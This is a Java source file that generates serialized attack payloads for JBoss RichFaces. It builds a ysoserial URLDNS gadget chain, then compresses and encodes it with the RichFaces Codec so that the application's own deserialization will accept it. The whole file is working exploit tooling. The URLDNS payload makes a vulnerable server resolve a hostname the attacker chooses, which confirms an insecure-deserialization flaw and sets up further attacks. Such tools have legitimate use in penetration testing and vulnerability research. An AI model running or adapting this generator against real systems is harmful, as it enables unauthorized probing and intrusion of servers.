import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.zip.Deflater;

import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.URLDNS;

import org.ajax4jsf.util.base64.Codec;


/**
 * DNS Gadget Chain:
 * HashMap.readObject()
 * HashMap.putVal( HashMap.hash() )
 * URL.hashCode()
 */

public class PayloadGenerator {
    // Import serialization mechanism used by JBoss Richfaces:
    //      serialization -> custom encoding -> output string

    protected static byte[] encrypt(byte[] src) {
        try {
            Deflater compressor = new Deflater(1);
            byte[] compressed = new byte[src.length + 100];
            compressor.setInput(src);
            compressor.finish();
            int totalOut = compressor.deflate(compressed);
            byte[] zipsrc = new byte[totalOut];
            System.arraycopy(compressed, 0, zipsrc, 0, totalOut);
            compressor.end();
            return (new Codec()).encode(zipsrc);
        } catch (Exception var5) {
            System.out.println(var5.getMessage());
        }
        return null;
    }

    public static String encodeBytesData(byte[] data) {
        if (data != null) {
            try {
                byte[] dataArray = encrypt(data);
                return new String(dataArray, "ISO-8859-1");
            } catch (Exception var2) {
                System.out.println(var2.getMessage());
            }
        }

        return null;
    }

    public static String encodeObjectData(Object data) {
        if (data != null) {
            try {
                ByteArrayOutputStream dataStream = new ByteArrayOutputStream(1024);
                ObjectOutputStream objStream = new ObjectOutputStream(dataStream);
                objStream.writeObject(data);
                objStream.flush();
                objStream.close();
                dataStream.close();
                return encodeBytesData(dataStream.toByteArray());
            } catch (Exception var3) {
                System.out.println(var3.getMessage());
            }
        }
        return null;
    }

    public static void main(final String... args) {
        final String command = args.length > 0 && args[0] != null ? args[0] : "8.8.8.8";

        System.out.println("generating payload object(s) for command: '" + command + "'");

        ObjectPayload<?> payload;
        final Object objBefore;
        try {
            payload = URLDNS.class.newInstance();
            objBefore = payload.getObject(command);
            System.out.println("serializing payload");
//            byte[] ser = Serializer.serialize(objBefore);
//            ObjectPayload.Utils.releasePayload(payload, objBefore);
            String output_string = encodeObjectData(objBefore);
            System.out.println("Payload: " + output_string);
        } catch (Exception e) {
            System.out.println("Error create object: " + e.toString());;
        }

    }
}
